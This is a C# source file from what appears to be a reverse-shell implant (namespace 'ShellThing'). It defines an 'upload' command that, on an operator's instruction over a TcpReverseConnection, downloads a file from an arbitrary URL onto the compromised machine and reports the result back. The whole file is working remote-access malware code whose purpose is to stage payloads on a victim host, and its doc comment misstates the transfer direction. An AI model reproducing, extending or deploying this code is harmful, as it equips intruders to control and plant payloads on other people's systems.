using System;
using System.Net;
using System.IO;
using System.Collections.Generic;
using System.Text;

namespace ShellThing
{
    /// <summary>
    /// Send a file to the remote host via HTTP (System.Net.WebClient).
    /// </summary>
    class UploadCommand : ICommand
    {
        private Uri uri;
        private string uploadPath;

        TcpReverseConnection connection;

        public void Execute(TcpReverseConnection connection, string[] commandArguments)
        {
            this.connection = connection;

            if (ValidateArguments(commandArguments))
            {
                WebClient webClient = new WebClient();

                try
                {
                    webClient.DownloadFile(uri.ToString(), uploadPath);
                    connection.SendData($"Upload: Successfully uploaded file to {uploadPath}\n");
                }
                catch (WebException e)
                {
                    connection.SendData($"Upload: Error - {e.Message}\n");
                }
            }
        }


        public bool ValidateArguments(string[] commandArguments)
        {
            if (commandArguments.Length == 3)
            {
                // Test whether the first argument is a valid absolute URI
                if (Uri.TryCreate(commandArguments[1], UriKind.Absolute, out uri))
                {
                    // Rough test for valid file path
                    try
                    {
                        uploadPath = Path.GetFullPath(commandArguments[2]);
                        return true;
                    }
                    catch (Exception)
                    {
                        connection.SendData($"Upload: Invalid file path argument {commandArguments[2]}\n");
                        return false;
                    }
                }
                else
                {
                    connection.SendData($"Upload: Invalid URL argument: {commandArguments[1]}\n");
                    return false;
                }
            }
            else
            {
                connection.SendData($"Upload: Error - Invalid number of arguments {commandArguments.ToString()}\n");
                return false;
            }
        }
    }
}
